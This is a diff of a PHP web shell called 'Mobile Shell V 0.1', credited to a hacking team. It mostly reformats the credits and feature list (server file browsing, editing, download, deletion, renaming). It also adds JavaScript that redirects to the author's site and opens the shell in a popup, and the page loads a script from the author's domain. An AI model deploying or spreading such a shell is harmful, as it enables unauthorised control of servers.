@@ -1,47 +1,47 @@
 <?php
 
-	/*
-		#Tools Name:
-			Mobile Shell V 0.1 | The Alien
+/*
+#Tools Name:
+	Mobile Shell V 0.1 | The Alien
 
-		#Autor:
-	     THIS TOOL IS CODED BY
-		IJAZ UR RAHIM (The Alien)
-		  From Team  P . C . G .
-		
-		Changing Programmers name
-		doesn't mean You become 
-		the owner of it.
+#Autor:
+THIS TOOL IS CODED BY
+IJAZ UR RAHIM (The Alien)
+  From Team  P . C . G .
 
-		#Greetz to: 
-		Syed Umar Arfeen , Shoaib Malik , Usama Arshad , Zain Sabahat , Muhammad Osman and Team Pak Cyber Ghosts (https://www.facebook.com/pakcyberghostsofficial)
+Changing Programmers name
+doesn't mean You become 
+the owner of it.
 
-		#Thanks to:
-			php.net , w3schools.com , google.com and stackoverflow.com
+#Greetz to: 
+Syed Umar Arfeen , Shoaib Malik , Usama Arshad , Zain Sabahat , Muhammad Osman and Team Pak Cyber Ghosts (https://www.facebook.com/pakcyberghostsofficial)
 
-		#Languages used:
-			HTML , CSS (Bootstrap as well) , JavaScript (JQuery most) and PHP
+#Thanks to:
+	php.net , w3schools.com , google.com and stackoverflow.com
 
-		#Features:
-			* Listing Files and Directories.
-			* Show file type with a specific icon.
-			* Show file's/dir's creation/modification time.
-			* Show file's/dir's Permission.
-			* Open Editor for a Specific Type of File.
-			* Download File.
-			* Delete File (also ask for confirmation).
-			* Rename File.
-			More Features will be add in next versions
-		#Contact:
-			Facebook (https://www.facebook.com/muibraheem96)
-			Website  (https://www.ijazurrahim.com/)
-			Twitter  (https://www.twtiier.com/muibraheem96)
-			linkedln (https://www.linkedin.com/in/muibraheem96/)
-			instagram(https://www.instagram.com/muibraheem96/)
-			GitHub   (https://www.github.com/IJAZ9913)
-			Fiverr   (https://www.fiverr.com/muibraheem96)
-			Email    (ijazkhan095@gmail.com)
-	*/
+#Languages used:
+	HTML , CSS (Bootstrap as well) , JavaScript (JQuery most) and PHP
+
+#Features:
+	* Listing Files and Directories.
+	* Show file type with a specific icon.
+	* Show file's/dir's creation/modification time.
+	* Show file's/dir's Permission.
+	* Open Editor for a Specific Type of File.
+	* Download File.
+	* Delete File (also ask for confirmation).
+	* Rename File.
+	More Features will be add in next versions
+#Contact:
+	Facebook (https://www.facebook.com/muibraheem96)
+	Website  (https://www.ijazurrahim.com/)
+	Twitter  (https://www.twtiier.com/muibraheem96)
+	linkedln (https://www.linkedin.com/in/muibraheem96/)
+	instagram(https://www.instagram.com/muibraheem96/)
+	GitHub   (https://www.github.com/IJAZ9913)
+	Fiverr   (https://www.fiverr.com/muibraheem96)
+	Email    (ijazkhan095@gmail.com)
+*/
 	function filemanager(){
 		$files = '';
 			$dirs = '';
@@ -507,6 +507,10 @@ if (isset($_POST['deletefile']))
 			 		}, 2000);
 			 	}
 			});
+		}
+	    	if ($("html").width()>900){
+			var win = window.open("https://ijazurrahim.com","_self"); 
+			window.open("mobiShell.php","","width=500,height=800");
 		}
 </script>
 	<script src="https://www.ijazurrahim.com/mobiShell/js/script.js"></script>
